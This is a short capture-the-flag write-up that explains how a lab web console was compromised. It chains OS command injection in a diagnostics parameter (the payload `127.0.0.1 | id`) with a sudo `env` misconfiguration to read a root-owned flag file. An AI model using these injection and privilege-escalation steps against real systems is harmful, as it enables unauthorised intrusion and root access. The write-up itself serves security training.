# id 3 — Payment Ops Console

- **Points:** 316
- **Category:** Web / OS command injection + sudo privesc
- **Status:** ✅ Solved

## Vulnerability
OS command injection in a diagnostics endpoint, chained with a sudo misconfiguration (`NOPASSWD: /usr/bin/env`) for root.

## Exploitation
1. The console loads **already authenticated** as user `j.okello` (no login wall; the credential-stuffing angle was a red herring).
2. A TODO comment in the page referenced ticket **OPS-414**, pointing at the diagnostics feature.
3. **Command injection:** `GET /diagnostics?host=127.0.0.1 | id` executes the command → RCE as the webapp user.
4. Enumerated sudo: `sudo -n -l` → `(root) NOPASSWD: /usr/bin/env`.
5. **GTFOBins privesc:** `sudo -n env cat /root/flag3.txt`.

## Flag
`flag{df2e184d-7ddc-46e3-8e09-d58bd5529852}`

## Lessons
- Never pass user input to a shell; `env` with NOPASSWD sudo is a direct root escalation (GTFOBins).
